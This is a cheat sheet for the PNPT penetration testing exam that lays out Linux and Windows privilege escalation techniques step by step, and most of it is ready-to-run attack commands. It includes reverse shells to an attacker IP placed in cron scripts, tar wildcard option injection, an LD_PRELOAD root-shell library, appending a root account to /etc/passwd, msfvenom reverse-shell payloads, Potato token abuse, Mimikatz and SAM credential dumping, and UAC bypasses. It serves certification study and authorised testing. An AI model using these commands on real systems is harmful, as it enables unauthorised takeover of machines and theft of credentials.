This is a privilege escalation techniques cheat sheet for the PNPT (Practical Network Penetration Tester) certification by TCM Security.

Linux uses techniques based on the file system and permission model, while Windows uses techniques based on its own unique architecture — so this guide is split into two parts.

All techniques are organized step-by-step to reflect the actual workflow used in both the exam and real-world penetration tests.

## PART 1: LINUX PRIVILEGE ESCALATION

### [Linux PrivEsc Attack Flow]

The goal of Linux privilege escalation is to identify the current user's permission scope, find misconfigurations or vulnerabilities, and obtain root access.

```bash
[Obtained regular user shell]

Phase 1. Automated Enumeration
  Use LinPEAS, LinEnum, pspy to map the full attack surface at once

[Identify vulnerable configs, SUID binaries, cron jobs, password locations]

Phase 2. Check sudo Configuration (do this first!)
  Use sudo -l to find commands executable without a password
  Chain with GTFOBins to immediately obtain root shell

Phase 3. Find SUID Binaries
  Collect SUID binary list with find
  Check GTFOBins for exploitation method

Phase 4. Check Cron Jobs
  Execute root code via writable scripts, wildcard injection, or PATH manipulation

Phase 5. Search for Passwords
  Collect credentials from bash_history, config files, /etc/shadow

Phase 6. Other Vectors
  NFS, kernel exploits, Docker/LXC groups, etc.

[Obtain root → screenshot → report]
```

※ In the exam, sudo misconfigurations and SUID binaries appear far more often than complex kernel exploits.

###

### [Phase 1: Automated Enumeration]

The goal is to check hundreds of privilege escalation vectors all at once.

### [1-1: LinPEAS]

LinPEAS is the most comprehensive automated enumeration script for Linux privilege escalation.

Results are color-coded — red/yellow items are the core attack vectors.

**Requirements:**

```bash
1. Shell access on the target machine
2. Internet access or HTTP server on attacker machine
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Start HTTP server on attacker machine
2. Download and run LinPEAS on target
3. Focus analysis on Red/Yellow items
4. Attempt privilege escalation with discovered vectors

--------------------------------------------------------------

(Attacker machine — start HTTP server)

python3 -m http.server 80

--------------------------------------------------------------

(Target machine — download and run)

wget http://[ATTACKER-IP]/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Save output
./linpeas.sh | tee linpeas_output.txt

# Run without touching disk (leaves no file)
curl http://[ATTACKER-IP]/linpeas.sh | sh

# Options
./linpeas.sh -a    # full scan including intensive checks
```

※ **Red/Yellow** items = 95~99% chance of being a privilege escalation vector — always verify manually.

### [1-2: pspy — Hidden Cron Detection]

pspy monitors all running processes and cron jobs in real time without root privileges.

It can detect hidden cron jobs that don't appear in /etc/crontab.

**Requirements:**

```bash
1. Shell access on the target machine
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Download and run pspy64
2. Monitor for processes running as UID=0 (root)
3. Discover periodically executed scripts
4. Check write permissions on those scripts → Cron Job attack

--------------------------------------------------------------

(Commands)

wget http://[ATTACKER-IP]/pspy64
chmod +x pspy64
./pspy64                          # basic run
./pspy64 -pf -i 1000              # include filesystem events, 1-second interval
```

### [1-3: Manual Enumeration — Essential Commands]

Unlike automated tools, manual enumeration is run immediately after getting a shell to quickly find privilege escalation vectors.

```bash
# Current user privileges (do this first!)
whoami && id
sudo -l                              # critical! check NOPASSWD entries immediately

# Find SUID files (core privesc vector)
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Check cron jobs (scheduled task abuse)
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/root 2>/dev/null

# System info
uname -a                             # kernel version (for kernel exploit research)
cat /etc/issue && cat /etc/os-release
hostname

# User list
cat /etc/passwd
cat /etc/shadow                      # crack immediately if readable

# Writable directories/files
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc

# Environment variables (for PATH hijacking)
env
echo $PATH

# Network
ifconfig && ip route
ss -tulnp                            # use ss instead of netstat

# Running processes
ps aux | grep root
```

### [Phase 2: sudo Misconfiguration]

The goal is to obtain a root shell using commands confirmed via sudo -l.

sudo misconfiguration is the most commonly seen privilege escalation vector in the PNPT exam.

### [2-1: GTFOBins Integration — sudo Shell Escape]

If sudo -l shows NOPASSWD entries, GTFOBins can show how to get root via that command.

※ NOPASSWD is typically configured in /etc/sudoers and completely bypasses sudo verification, enabling root access.

**Requirements:**

```bash
1. sudo -l output shows allowed commands
2. Access to GTFOBins (https://gtfobins.github.io)
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Run sudo -l → check allowed commands
2. Search the binary on GTFOBins
3. Run the command from the Sudo section → root shell

--------------------------------------------------------------

(Reading sudo -l output)

# Defaults env_keep+=LD_PRELOAD   ← LD_PRELOAD attack possible
# (root) NOPASSWD: /usr/bin/find  ← can run find as root with no password
# (ALL, !root) /bin/bash          ← CVE-2019-14287 target

--------------------------------------------------------------

(GTFOBins — Sudo section key binaries)

sudo find . -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo vim -c ':!/bin/bash'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo env /bin/bash
sudo perl -e 'exec "/bin/bash";'
sudo less /etc/passwd  →  !/bin/bash          # type ! inside less
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### [2-2: LD_PRELOAD Attack]

If sudo -l shows env_keep+=LD_PRELOAD, any sudo-allowed binary can be used to obtain a root shell.

※ LD_PRELOAD is an environment variable that loads a user-specified library before a program runs. When /etc/sudoers has "Defaults env_keep+=LD_PRELOAD", this variable is preserved during sudo execution, allowing a malicious library to be loaded with root privileges.

**Requirements:**

```bash
1. sudo -l output includes env_keep+=LD_PRELOAD
2. At least one sudo NOPASSWD command exists (needed to run sudo)
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Write a malicious shared object (.so) file
2. Compile with gcc
3. Load the malicious .so via LD_PRELOAD when running a sudo command
4. Obtain root shell

--------------------------------------------------------------

(Commands)

# Write and compile malicious .so
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# Execute with any allowed sudo command
sudo LD_PRELOAD=/tmp/shell.so find
sudo LD_PRELOAD=/tmp/shell.so apache2
```

### [Phase 3: SUID/SGID Binaries]

The goal is to obtain a root shell via binaries owned by root with the SUID bit set.

Binaries with the SUID bit execute with the file owner's privileges (usually root) regardless of who runs them.

### [3-1: SUID Discovery & GTFOBins Integration]

**Requirements:**

```bash
1. Shell access on target machine
2. Access to GTFOBins
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Collect SUID binary list with find
2. Exclude default system binaries (su, passwd, mount, ping)
3. Search non-standard binaries on GTFOBins → check SUID section
4. Run the command → root shell

--------------------------------------------------------------

(SUID Discovery)

find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f -ls 2>/dev/null    # with details
find / -perm /6000 -type f 2>/dev/null        # SUID + SGID

--------------------------------------------------------------

(GTFOBins — SUID section key binaries)

# bash
bash -p                                        # -p: retain effective UID → root

# find
find . -exec /bin/sh -p \; -quit

# python
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# env
env /bin/sh -p

# nmap (old versions 2.02-5.21)
nmap --interactive
!sh
```

### [3-2: PATH Hijacking — When SUID Binary Calls Commands Without Absolute Path]

If a SUID binary calls commands like system("ps") without an absolute path, manipulate PATH to run a malicious binary first.

**Requirements:**

```bash
1. SUID binary calls commands without absolute path
2. Can confirm the called command via strings/ltrace/strace
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Use strings to identify commands called by the SUID binary
2. Create a malicious script with the same name as the called command
3. Prepend the malicious script's directory to PATH
4. Run SUID binary → malicious script executes as root

--------------------------------------------------------------

(Commands)

# Analyze SUID binary
strings /path/to/suid_binary
ltrace /path/to/suid_binary                   # trace library calls

# If "ps" is called without absolute path
cd /tmp
echo '/bin/bash -p' > ps && chmod +x ps
export PATH=/tmp:$PATH
/path/to/suid_binary                           # executes /tmp/ps → root shell
```

### [Phase 4: Cron Job Abuse]

The goal is to execute code with root privileges by exploiting misconfigured scheduled tasks that root runs.

### [4-1: Writable Cron Script]

**Requirements:**

```bash
1. Write access to a script executed by a root cron job
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Check crontab → identify scripts run by root
2. Verify write permissions on those scripts
3. Insert reverse shell or SUID bash payload
4. Wait for cron execution → obtain root

--------------------------------------------------------------

(Crontab Enumeration)

cat /etc/crontab
ls -la /etc/cron*
./pspy64                           # essential for detecting hidden crons

--------------------------------------------------------------

(Commands)

# Check write permissions
ls -la /opt/scripts/cleanup.sh    # if -rwxrwxrwx, it can be abused

# Insert reverse shell
echo '#!/bin/bash' > /opt/scripts/cleanup.sh
echo 'bash -i >& /dev/tcp/[ATTACKER-IP]/4444 0>&1' >> /opt/scripts/cleanup.sh

# Or create SUID bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
# After cron runs: /tmp/rootbash -p
```

### [4-2: tar Wildcard Injection]

Abuses the fact that filenames are interpreted as tar options when a cron job uses tar *.

**Requirements:**

```bash
1. /etc/crontab contains a command using tar *
2. Write access to that directory
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Confirm tar * usage in crontab
2. Create malicious files in that directory
3. Filenames are interpreted as tar options
4. Cron runs → reverse shell executed as root

--------------------------------------------------------------

(Commands)

# /etc/crontab: * * * * * root cd /home/user && tar -cf /tmp/backup.tar *

# Create reverse shell script
echo '#!/bin/bash' > /home/user/shell.sh
echo 'bash -i >& /dev/tcp/[ATTACKER-IP]/4444 0>&1' >> /home/user/shell.sh
chmod +x /home/user/shell.sh

# Create files whose names become tar options
echo "" > "/home/user/--checkpoint=1"
echo "" > "/home/user/--checkpoint-action=exec=sh shell.sh"

# Result: tar ... --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

###

### [Phase 5: Password & Credential Search]

The goal is to collect plaintext passwords and hashes from across the system.

Password reuse is extremely common — finding even one can lead to full system compromise.

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Check bash_history for commands containing passwords
2. Search config files for DB/service credentials
3. If /etc/shadow is readable → crack offline
4. Try su root or sudo with discovered passwords

--------------------------------------------------------------

(Commands)

# History files
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
grep -i "password\|passwd\|pass" ~/.bash_history

# Search config files for passwords
grep -ri "password" /etc/ /opt/ /var/www/ 2>/dev/null
find / -name "wp-config.php" 2>/dev/null       # WordPress DB password
find / -name "*.env" -o -name "*.conf" 2>/dev/null
find / -name "id_rsa" 2>/dev/null              # SSH private key

# Crack /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
hashcat -m 1800 -a 0 shadow_hashes.txt rockyou.txt

# If /etc/passwd is writable → directly add root user
openssl passwd -1 -salt hacker password123
echo 'hacker:[generated hash]:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### [Phase 6: Other Vectors]

### [6-1: NFS no_root_squash]

If no_root_squash is set on an NFS share, root on the attacker machine retains root privileges on the shared folder.

**Requirements:**

```bash
1. NFS service running on target
2. no_root_squash configured in /etc/exports
3. Root access on attacker machine
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Check NFS shares with showmount
2. Confirm no_root_squash setting
3. Mount as root on attacker machine
4. Create SUID binary → execute on target

--------------------------------------------------------------

(Commands)

# Enumerate
showmount -e [TARGET-IP]
cat /etc/exports                              # check for no_root_squash

# Mount on attacker machine (as root)
mkdir /tmp/nfsdir
sudo mount -o rw,vers=3 [TARGET-IP]:/share /tmp/nfsdir

# Create SUID bash
cp /bin/bash /tmp/nfsdir/
sudo chown root:root /tmp/nfsdir/bash
sudo chmod +s /tmp/nfsdir/bash

# Execute on target
cd /share && ./bash -p
```

### [6-2: Kernel Exploits]

Kernel vulnerabilities can immediately obtain root from any privilege level, but carry a risk of system crash — try last.

※ The kernel is the core of the OS, acting as the intermediary between hardware and programs.

**Requirements:**

```bash
1. Confirm vulnerable kernel version
2. searchsploit or linux-exploit-suggester results
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Check kernel version with uname -a
2. Run linux-exploit-suggester to get vulnerable exploit list
3. Copy exploit code with searchsploit
4. Compile and execute on target

--------------------------------------------------------------

(Commands)

uname -a
./linux-exploit-suggester.sh
searchsploit linux kernel 5.4 privilege escalation

# DirtyCow (CVE-2016-5195) — kernel 2.6.22 ~ 3.9
searchsploit -m linux/local/40839.c
gcc -pthread 40839.c -o dirty -lcrypt
./dirty my-new-password
su firefart

# PwnKit (CVE-2021-4034) — Polkit, affects almost all distros
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit
```

※ If the target has no gcc (compiler), compile on the attacker machine and transfer the binary. Use the -static flag to bundle all dependencies so it runs regardless of the target's environment.

### [6-3: Docker Group]

Users in the docker group can access the entire host filesystem as root.

**Requirements:**

```bash
1. id output includes the docker group
```

**Commands:**

```bash
id                                            # confirm docker group membership

# Mount host filesystem → root shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## PART 2: WINDOWS PRIVILEGE ESCALATION

### [Windows PrivEsc Attack Flow]

The goal of Windows privilege escalation is to exploit misconfigurations in services, registry, tokens, and file permissions to obtain SYSTEM privileges.

```bash
[Obtained regular user shell]

Phase 1. Automated Enumeration
  Use WinPEAS, PowerUp to map the full attack surface at once

[Identify SeImpersonatePrivilege, service errors, registry vulnerabilities, password locations]

Phase 2. Check SeImpersonatePrivilege (do this first!)
  Confirm with whoami /priv
  Use Potato-family attacks to obtain SYSTEM immediately

Phase 3. Service Misconfigurations
  Unquoted Service Path, weak permissions, binpath modification

Phase 4. Registry Exploitation
  AlwaysInstallElevated, AutoRun, stored credentials

Phase 5. Password Search
  SAM dump, LSA Secrets, config files, PowerShell history

Phase 6. Other Vectors
  DLL hijacking, UAC bypass, scheduled tasks

[Obtain SYSTEM → screenshot → report]
```

※ When you get a shell as an IIS, MSSQL, or WCF service account, there's a very high chance SeImpersonatePrivilege is present — SYSTEM escalation is immediate.

### [Phase 1: Automated Enumeration]

The goal is to identify dozens of privilege escalation vectors at once using WinPEAS and PowerUp.

### [1-1: WinPEAS]

WinPEAS is the most comprehensive automated enumeration tool, covering nearly all Windows privilege escalation vectors.

**Requirements:**

```bash
1. Shell access on the target Windows machine
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Prepare WinPEAS download on attacker machine
2. Transfer to target
3. Enable color output, then run
4. Focus analysis on Red items

--------------------------------------------------------------

(Transfer to target)

certutil -urlcache -f http://[ATTACKER-IP]/winPEASx64.exe winpeas.exe
powershell iwr -Uri http://[ATTACKER-IP]/winPEASx64.exe -OutFile winpeas.exe

--------------------------------------------------------------

(Commands)

# Enable color output (run this first!)
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

.\winpeas.exe                 # full scan
.\winpeas.exe quiet           # compact output
.\winpeas.exe systeminfo      # specific module only
.\winpeas.exe servicesinfo
.\winpeas.exe windowscreds
```

### [1-2: [PowerUp.ps](http://PowerUp.ps)1]

[PowerUp.ps](http://PowerUp.ps)1 provides an AbuseFunction directly for each discovered vulnerability, enabling one-click exploitation.

**Requirements:**

```bash
1. PowerShell execution available
2. PowerUp.ps1 available (PowerSploit)
```

**Commands:**

```bash
powershell -ep bypass
. .\PowerUp.ps1

Invoke-AllChecks                              # full check + AbuseFunction

# Individual functions
Get-UnquotedService                           # unquoted service paths
Get-ModifiableServiceFile                     # writable service binaries
Get-ModifiableService                         # services with weak permissions
Find-ProcessDLLHijack                         # DLL hijacking opportunities

# Auto-exploit
Invoke-ServiceAbuse -Name 'VulnSvc'
```

### [1-3: Manual Enumeration — Essential Commands]

Just like on Linux, manual enumeration is run immediately after getting a shell to find privilege escalation vectors.

```bash
# Current privileges (do first — check SeImpersonatePrivilege)
whoami /priv
whoami /all

# System info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(s)"

# User info
net user
net localgroup administrators

# Running services
sc query
net start

# Running processes
tasklist /v

# Network
ipconfig /all
netstat -ano

# Stored credentials
cmdkey /list

# Search registry for passwords
reg query HKLM /f password /t REG_SZ /s

# AV status
sc query windefend
```

### [Phase 2: Potato-Family Attacks — SeImpersonatePrivilege Abuse]

The goal is to steal the SYSTEM token using SeImpersonatePrivilege.

Service accounts like IIS, MSSQL, and WCF have SeImpersonatePrivilege by default — once you get a service account shell, SYSTEM escalation is immediate.

**Requirements:**

```bash
1. Confirm SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege in whoami /priv
```

**Potato Tool Selection Guide:**

```bash
(Potato Tool Selection Guide)

PrintSpoofer  → Windows 10 1607+, Server 2016/2019 (simplest, try first)
GodPotato     → Windows 8~11, Server 2012~2022 (widest compatibility)
JuicyPotato   → Windows 7~10 ≤1803, Server 2008~2016 (requires CLSID)
RoguePotato   → Windows 10 1809+, Server 2019+ (requires attacker port 135)
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Confirm SeImpersonatePrivilege with whoami /priv
2. Check Windows version with systeminfo
3. Try PrintSpoofer first → if fails, try GodPotato → then JuicyPotato
4. Obtain SYSTEM shell

--------------------------------------------------------------

(PrintSpoofer — simplest)

PrintSpoofer.exe -i -c cmd                    # interactive SYSTEM shell
PrintSpoofer.exe -c "C:\temp\reverse.exe"     # execute reverse shell

--------------------------------------------------------------

(GodPotato — widest compatibility)

GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe [ATTACKER-IP] 4444 -e cmd"
GodPotato-NET4.exe -cmd "cmd /c whoami > C:\temp\result.txt"

--------------------------------------------------------------

(JuicyPotato — older Windows)

JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

# CLSIDs vary by Windows version
# Reference: https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

### [Phase 3: Service Misconfigurations]

The goal is to escalate to SYSTEM by exploiting path errors or weak permissions in Windows services.

### [3-1: Unquoted Service Path]

If a service path contains spaces and is not quoted, Windows tries each path segment in order.

C:\Program Files\Vuln Service\binary.exe → tries C:\Program.exe → C:\Program Files\Vuln.exe → so place a malicious file in the writable path.

**Requirements:**

```bash
1. A service path with spaces and no quotes
2. Write access to a directory in the path
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Find unquoted service paths
2. Confirm a writable directory in the path
3. Place malicious executable there
4. Restart service → malicious file runs as SYSTEM

--------------------------------------------------------------

(Commands)

# Find vulnerable services
wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# Check specific service
sc qc VulnService

# Check directory write permissions
icacls "C:\Program Files\Vuln Service"        # look for (F), (M), (W)
accesschk64.exe /accepteula -wvu "C:\Program Files\Vuln Service"

# Generate payload (on attacker)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=4444 -f exe -o Vuln.exe

# Place and restart service
copy Vuln.exe "C:\Program Files\Vuln.exe"
sc stop VulnService && sc start VulnService
```

### [3-2: Weak Service Permissions (binpath modification)]

If the service itself has SERVICE_CHANGE_CONFIG permission, change the executable path to a malicious one.

※ SERVICE_CHANGE_CONFIG = permission to modify service configuration, allowing path change to execute a malicious file.

**Requirements:**

```bash
1. SERVICE_CHANGE_CONFIG or higher on the service
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Check service permissions with accesschk
2. Confirm SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG
3. Change binpath to malicious executable
4. Restart service → malicious file runs as SYSTEM

--------------------------------------------------------------

(Commands)

# Check service permissions
accesschk64.exe /accepteula -uwcqv "Users" *
accesschk64.exe /accepteula -wuvc VulnService

# Change binpath
sc config VulnService binpath= "C:\temp\reverse.exe"
sc stop VulnService && sc start VulnService

# Add admin user
sc config VulnService binpath= "net localgroup administrators hacker /add"
sc stop VulnService && sc start VulnService
```

### [Phase 4: Registry Exploitation]

The goal is to induce high-privilege code execution through misconfigured registry settings.

### [4-1: AlwaysInstallElevated]

If AlwaysInstallElevated is set to 0x1 in both HKLM and HKCU, MSI files run by any user install with SYSTEM privileges — enabling privilege escalation via a malicious MSI.

※ HKLM = system-wide registry settings

※ HKCU = current user registry settings

**Requirements:**

```bash
1. AlwaysInstallElevated = 0x1 in both HKLM and HKCU
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Check registry values (both must be 1)
2. Generate malicious MSI
3. Run silent install → payload executes as SYSTEM

--------------------------------------------------------------

(Commands)

# Check registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious MSI (on attacker)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=4444 -f msi -o shell.msi

# Execute on target
msiexec /quiet /qn /i shell.msi
```

### [4-2: Registry-Stored Credentials]

AutoLogon settings, AutoRun entries, and saved passwords are often stored in plaintext in the registry.

※ Registry = database where Windows stores configuration values.

```bash
# AutoLogon password
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# Search all registry for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Stored credentials
cmdkey /list
runas /savecred /user:Administrator cmd.exe

# Check AutoRun binary write permissions
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
icacls "[AutoRun binary path]"
```

### [Phase 5: Password Search]

The goal is to collect credentials from across the Windows system.

### [5-1: SAM Dump — Extract Local Account Hashes]

The SAM database stores NTLM hashes of local user accounts.

**Requirements:**

```bash
1. SYSTEM or administrator privileges
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Save SAM and SYSTEM files
2. Transfer to attacker machine
3. Extract hashes with secretsdump
4. Crack hashes or use Pass-the-Hash

--------------------------------------------------------------

(Target — save SAM/SYSTEM)

reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Attacker machine — extract hashes (Impacket)
secretsdump.py -sam SAM -system SYSTEM LOCAL
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### [5-2: Mimikatz — LSASS Memory Dump]

Mimikatz extracts plaintext passwords and NTLM hashes from LSASS memory.

**Requirements:**

```bash
1. SYSTEM or administrator privileges
2. SeDebugPrivilege
```

**Commands:**

```bash
privilege::debug
token::elevate
sekurlsa::logonpasswords          # dump plaintext + hashes from LSASS memory
lsadump::sam                      # dump SAM database
lsadump::secrets                  # dump LSA Secrets
```

### [5-3: File System Password Search]

Searching the file system for passwords can lead directly to admin access without privilege escalation — run alongside manual enumeration.

※ The goal is to find passwords an admin accidentally left in a file. If found, the entire escalation process can be skipped.

```bash
# Search files for passwords
findstr /si password *.txt *.ini *.config *.xml
dir /s *pass* *cred* *vnc* *.config 2>nul

# PowerShell history (critical!)
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Unattend.xml (may contain admin password)
dir /s *sysprep.inf *unattend.xml 2>nul

# IIS web.config
type C:\inetpub\wwwroot\web.config | findstr -i "connectionstring password"

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile <profile name> key=clear
```

### [Phase 6: Other Vectors]

### [6-1: DLL Hijacking]

If a high-privilege process loads a DLL from a writable path, a malicious DLL can be injected there.

※ Process = a running program

※ DLL = a shared code library used by multiple programs

**Requirements:**

```bash
1. A high-privilege process that loads a DLL from a writable path
2. Detect "NAME NOT FOUND" DLL entries via Procmon
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Filter Procmon for NAME NOT FOUND + .dll
2. Confirm write access to the missing DLL path
3. Generate and place malicious DLL
4. Restart service → malicious DLL loaded with elevated privileges

--------------------------------------------------------------

(Generate malicious DLL)

# msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=4444 -f dll -o hijack.dll

# Place and restart service
copy hijack.dll "C:\target\directory\expected_dll.dll"
sc stop ServiceName && sc start ServiceName
```

### [6-2: UAC Bypass]

UAC runs even administrator accounts at Medium integrity by default — meaning even admin accounts run with standard privileges unless elevated.

In a remote shell, UAC prompts cannot be clicked, so programmatic bypass is required.

**Requirements:**

```bash
1. Current user is a member of the Administrators group
2. whoami /groups shows Mandatory Label\Medium
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Confirm Medium integrity with whoami /groups
2. Attempt fodhelper bypass
3. Execute commands from a High integrity process

--------------------------------------------------------------

(fodhelper.exe bypass — most reliable)

reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
# → spawns a High integrity cmd!

# Cleanup
reg delete HKCU\Software\Classes\ms-settings /f

--------------------------------------------------------------

(eventvwr.exe bypass)

reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f
```
